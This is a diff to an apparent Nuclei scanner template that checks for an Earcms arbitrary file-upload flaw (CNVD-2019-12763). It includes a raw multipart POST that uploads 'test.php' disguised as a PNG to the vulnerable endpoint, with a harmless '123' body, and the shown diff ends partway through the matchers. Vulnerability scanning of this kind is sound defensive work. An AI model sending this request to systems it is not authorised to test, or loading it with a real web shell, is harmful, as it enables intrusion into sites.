@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: earcms-upload
 
 info:
@@ -7,7 +8,7 @@ info:
   reference: https://www.cnvd.org.cn/flaw/show/CNVD-2019-12763
   tags: Earcms,upload
 
-requests:
+http:
   - raw:
       - |
         POST /earcms/source/pack/upload/index-uplog.php HTTP/1.1
@@ -19,14 +20,14 @@ requests:
         -----------------------------4219849002870802959186602799
         Content-Disposition: form-data; name="app"; filename="test.php"
         Content-Type: image/png
-        
+
         123
         -----------------------------4219849002870802959186602799
         Content-Disposition: form-data; name="time"
-        
+
         1-1
         -----------------------------4219849002870802959186602799--
-   
+
     matchers-condition: and
     matchers:
       - type: status
